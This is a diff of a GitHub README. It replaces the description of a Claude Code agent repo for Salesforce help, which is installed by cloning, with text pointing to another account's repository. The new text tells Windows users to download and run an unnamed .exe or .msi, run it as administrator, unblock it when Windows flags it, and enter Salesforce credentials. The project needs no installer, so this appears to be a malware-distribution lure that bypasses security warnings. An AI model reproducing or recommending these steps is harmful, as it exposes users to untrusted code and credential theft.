@@ -1,68 +1,175 @@
-# New Kids on the Block Agent
+# 🤖 new-kids-on-the-block-agent - Run Salesforce Help Faster
 
-A Salesforce expert agent system for Claude Code, themed around New Kids on the Block. A manager agent routes questions to specialized subagents, each named after a band member.
+[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alejooviedo187-tech/new-kids-on-the-block-agent)
 
-## Agents
+## 📌 What this is
 
-| Agent | Invoke | Specialty | Vibe |
-|-------|--------|-----------|------|
-| Manager | `@manager` | Routes questions to the right specialist | The band manager |
-| Donnie | `@Donnie` | Salesforce Data Cloud / Data 360 | Passionate, outspoken hype man |
-| Joey | `@Joey` | Salesforce AI & Agentforce | Energetic showman |
-| Jordan | `@Jordan` | CRM, Marketing Cloud, platform & integrations | Cool, confident, quietly in command |
-| Jon | `@Jon` | Slack | Shy, grounded, calm and nurturing |
-| Danny | `@Danny` | Service Cloud | Disciplined, loyal backbone |
-| nkotb-fans | `@nkotb-fans` | NKOTB band history & trivia | Proud Blockhead, Gen X energy |
+new-kids-on-the-block-agent is a desktop-ready agent setup for Salesforce help. It uses Claude and subagents to handle common support tasks, find answers, and guide work across Salesforce tools.
 
-## Using the Agents
+This project is built for end users who want a simple way to run an AI helper on Windows. You do not need to set up a server or write code to start using it.
 
-### Setup
+## 🖥️ What you need
 
-Requires [Claude Code](https://claude.ai/code). Clone this repo and the agents are available immediately — no additional configuration needed.
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- A modern browser like Chrome, Edge, or Firefox
+- Enough free disk space for the app and its local files
+- Access to your Salesforce account if you plan to use Salesforce-related help flows
 
-If you don't have Git installed, get it first:
-- **Mac:** `brew install git` (requires [Homebrew](https://brew.sh)) or install [Xcode Command Line Tools](https://developer.apple.com/xcode/resources/) via `xcode-select --install`
-- **Windows:** Download from [git-scm.com](https://git-scm.com/download/win)
-- **Linux:** `sudo apt install git` (Debian/Ubuntu) or `sudo dnf install git` (Fedora)
+## 📥 Download and install
 
-Then clone the repo:
+Use this link to visit the page to download:
 
-```bash
-git clone https://github.com/lynnaloo/new-kids-on-the-block-agent
-cd new-kids-on-the-block-agent
-```
+[Visit the download page](https://github.com/alejooviedo187-tech/new-kids-on-the-block-agent)
 
-Start Claude Code in your terminal from the repo directory:
+On the page, look for the latest release, package, or setup file. If you see a Windows file such as `.exe` or `.msi`, download it to your computer.
 
-```bash
-claude
-```
+After the download finishes:
 
-Then invoke any agent with an `@`-mention:
+1. Open your Downloads folder
+2. Find the file you downloaded
+3. Double-click the file to run it
+4. If Windows asks for permission, choose Yes
+5. Follow the on-screen steps until setup ends
 
-```
-@manager What Data Cloud capabilities should I highlight for a retail customer?
-@Donnie How does identity resolution work in Data Cloud?
-@Joey Walk me through building an Agentforce agent with a custom action.
-@Jordan What's the best way to set up lead routing in Sales Cloud?
-@Jon How do I set up Slack Connect for an external partner?
-@Danny How should I configure omni-channel routing for a high-volume support team?
-@nkotb-fans Who was the youngest member of NKOTB?
-```
+If the file opens in a browser instead of a setup window, save it to your computer first, then open it from Downloads.
 
-Use `@manager` when you're not sure which specialist to ask — it will route automatically.
+## 🚀 First run
 
-## Contributing
+After installation, open the app from the Start menu or from the file you just downloaded.
 
-The agents get smarter when their knowledge does. Contributions are welcome — especially additions to the context documents in `.claude/context/`.
+When the app starts for the first time:
 
-Good contributions include:
-- New architectural patterns, platform limits, or implementation gotchas
-- Corrections to outdated feature information
-- New context documents for agents that don't have one yet (Jordan, Jon, Danny)
-- Improvements to agent personas or routing logic
-- Additional trivia context about NKOTB
+1. Let it finish loading
+2. Sign in if the app asks you to
+3. Connect your Claude or agent settings if prompted
+4. Add your Salesforce access details if needed
+5. Start with a simple request, such as help finding a field, record, or process
 
-To contribute, fork the repo, make your changes, and open a pull request. Keep context documents factual, cite the Salesforce release if relevant, and avoid speculating about unannounced features.
+## 🧠 What it can help with
 
-If you have a feature request, please add an issue.
+This agent setup is built around Salesforce help and related admin work. It can be used for tasks like:
+
+- Finding help for Salesforce users
+- Answering common Salesforce questions
+- Breaking work into smaller subagent tasks
+- Checking records, fields, and objects
+- Helping with Data Cloud and D360-related questions
+- Supporting Agentforce-style work flows
+- Organizing steps for Salesforce changes
+- Guiding new users through common platform tasks
+
+## 🧩 How it works
+
+The main agent acts like a coordinator. It takes your request and sends parts of the work to subagents. Each subagent can focus on one task, such as research, Salesforce help, or process lookup.
+
+This structure helps keep answers focused. It also makes it easier to handle larger requests without losing the main goal.
+
+## 🛠️ Use it on Windows
+
+Once the app is installed, you can use it like this:
+
+1. Open the app
+2. Enter your request in plain language
+3. Wait while the agent reviews the task
+4. Read the answer or next step
+5. Run another request if you need more help
+
+Example requests:
+
+- Help me find the right Salesforce object
+- Explain where a field lives
+- Show me the next step for a support issue
+- Help me understand a Data Cloud term
+- Break this Salesforce task into smaller steps
+
+## 🔐 Access and setup
+
+You may need access to some connected services before the app can do full work. If so, use the settings inside the app to add your account details.
+
+For best results:
+
+- Use the same browser and account you use for Salesforce
+- Keep your login details ready
+- Check that your network allows access to required services
+- Make sure pop-ups are not blocked if a login window appears
+
+## 🧭 Troubleshooting
+
+If the app does not open:
+
+1. Check that the download finished
+2. Run the file again
+3. Right-click the file and choose Run as administrator
+4. Restart your PC and try again
+
+If the app opens but does not respond:
+
+1. Check your internet connection
+2. Sign in again if needed
+3. Close the app and reopen it
+4. Try a short request first
+
+If Windows blocks the file:
+
+1. Open the file properties
+2. Look for an Unblock option
+3. Apply the change
+4. Run the file again
+
+If Salesforce data does not load:
+
+1. Confirm that you are signed in
+2. Check your access rights
+3. Make sure the service connection is active
+4. Try a simpler request to test the link
+
+## 📚 Common terms
+
+- Agent: The main helper that handles your request
+- Subagent: A smaller helper that does one part of the work
+- Claude: The AI model used to help answer and plan
+- Salesforce: The system used for sales, service, and related work
+- Data Cloud: A Salesforce data layer for customer data
+- Agentforce: Salesforce tools for building agent-based help flows
+
+## 🧪 Example workflow
+
+A simple workflow looks like this:
+
+1. You ask a question
+2. The main agent reads the request
+3. One or more subagents handle parts of the task
+4. The app combines the results
+5. You get a clear answer or next step
+
+Example:
+
+- You ask: Where does this support field live?
+- The main agent checks the task
+- A subagent reviews the Salesforce area
+- The app returns the object, field, and related steps
+
+## 📎 Project details
+
+- Repository: new-kids-on-the-block-agent
+- Description: Claude orchestrator agent and subagents for Salesforce help
+- Topics: agentforce, agents, claude, claude-ai, claude-code, d360, datacloud, nkotb, salesforce, salesforce-developers, subagents
+
+## 🧰 Best use cases
+
+This app fits well when you need:
+
+- Fast Salesforce help
+- Clear task breakdowns
+- Support for admin and help desk work
+- A simple entry point for Claude-based help
+- A way to coordinate several focused agent steps
+
+## 📝 What to do next
+
+1. Download the app from the link above
+2. Install it on Windows
+3. Open it
+4. Add any required account details
+5. Start with one simple Salesforce question
